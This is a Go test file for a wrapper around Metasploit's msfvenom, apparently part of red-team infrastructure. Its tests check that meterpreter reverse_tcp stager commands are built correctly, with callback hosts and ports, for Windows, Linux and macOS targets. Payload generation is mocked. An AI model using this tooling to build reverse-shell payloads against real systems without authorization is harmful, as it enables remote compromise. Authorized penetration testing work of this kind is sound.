package msfvenom

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/rinfra/rinfra/internal/payload"
)

func TestBuildArgs_WindowsX64(t *testing.T) {
	spec := payload.Spec{
		Platform: "windows",
		Arch:     "x64",
		Format:   "exe",
		Callback: payload.Callback{Host: "10.0.0.5", Port: 8443},
		Extra:    map[string]string{"EXITFUNC": "thread"},
	}
	args := buildArgs(spec, "/out/stager.exe")
	got := strings.Join(args, " ")
	for _, want := range []string{
		"-p windows/x64/meterpreter/reverse_tcp",
		"LHOST=10.0.0.5",
		"LPORT=8443",
		"-a x64",
		"--platform windows",
		"EXITFUNC=thread",
		"-f exe",
		"-o /out/stager.exe",
	} {
		if !strings.Contains(got, want) {
			t.Errorf("args %q missing %q", got, want)
		}
	}
}

func TestPayloadModule(t *testing.T) {
	cases := map[string]struct{ plat, arch, want string }{
		"linux x86": {"linux", "x86", "linux/x86/meterpreter/reverse_tcp"},
		"linux x64": {"linux", "x64", "linux/x64/meterpreter/reverse_tcp"},
		"macos":     {"macos", "x64", "osx/x64/meterpreter/reverse_tcp"},
		"default":   {"", "", "windows/x64/meterpreter/reverse_tcp"},
	}
	for name, c := range cases {
		t.Run(name, func(t *testing.T) {
			if got := payloadModule(payload.Spec{Platform: c.plat, Arch: c.arch}); got != c.want {
				t.Errorf("payloadModule = %q, want %q", got, c.want)
			}
		})
	}
}

func TestGenerate_InvokesBinaryAndHashes(t *testing.T) {
	dir := t.TempDir()
	var capturedArgs []string
	g := &generator{
		lookPath: func(string) (string, error) { return "/usr/bin/msfvenom", nil },
		runCommand: func(_ context.Context, name string, args ...string) ([]byte, error) {
			capturedArgs = args
			// Simulate the binary writing the artifact to the -o path.
			out := args[len(args)-1]
			return nil, os.WriteFile(out, []byte("STAGER-BYTES"), 0o600)
		},
		outputDir: dir,
	}
	art, err := g.Generate(context.Background(), payload.Spec{
		Platform: "linux", Arch: "x64", Format: "elf",
		Callback: payload.Callback{Host: "1.2.3.4", Port: 443},
	})
	if err != nil {
		t.Fatalf("Generate: %v", err)
	}
	if art.Path != filepath.Join(dir, "rinfra-stager.elf") {
		t.Errorf("Path = %q", art.Path)
	}
	if art.Format != "elf" {
		t.Errorf("Format = %q", art.Format)
	}
	// sha256("STAGER-BYTES")
	if art.SHA256 == "" || len(art.SHA256) != 64 {
		t.Errorf("SHA256 = %q, want 64 hex chars", art.SHA256)
	}
	if capturedArgs[0] != "-p" {
		t.Errorf("first arg = %q, want -p", capturedArgs[0])
	}
}

func TestGenerate_Validation(t *testing.T) {
	g := &generator{lookPath: func(string) (string, error) { return "/usr/bin/msfvenom", nil }}
	if _, err := g.Generate(context.Background(), payload.Spec{Format: "exe", Callback: payload.Callback{Port: 1}}); err == nil {
		t.Error("expected error when LHOST missing")
	}
	if _, err := g.Generate(context.Background(), payload.Spec{Format: "exe", Callback: payload.Callback{Host: "x"}}); err == nil {
		t.Error("expected error when LPORT missing")
	}
}
